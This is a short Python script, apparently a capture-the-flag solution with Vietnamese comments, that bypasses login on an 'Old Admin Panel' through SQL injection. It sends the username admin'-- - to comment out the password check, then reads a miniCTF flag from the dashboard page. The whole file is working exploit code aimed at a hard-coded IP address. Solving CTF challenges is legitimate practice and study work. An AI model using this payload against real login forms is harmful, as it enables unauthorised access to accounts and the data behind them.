#!/usr/bin/env python3
# web1 — SQL injection auth bypass trên form login của "Old Admin Panel".
import re, urllib.request, urllib.parse, http.cookiejar

B = "http://103.116.52.180:29129"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# username = admin'-- -  làm câu query thành:  ... WHERE username='admin'-- -' AND ...
body = urllib.parse.urlencode({"username": "admin'-- -", "password": "x"}).encode()
op.open(urllib.request.Request(B + "/login", data=body), timeout=15)  # set cookie phiên

html = op.open(B + "/dashboard", timeout=15).read().decode()
print("flag:", re.search(r"miniCTF\{[^}]*\}", html).group())
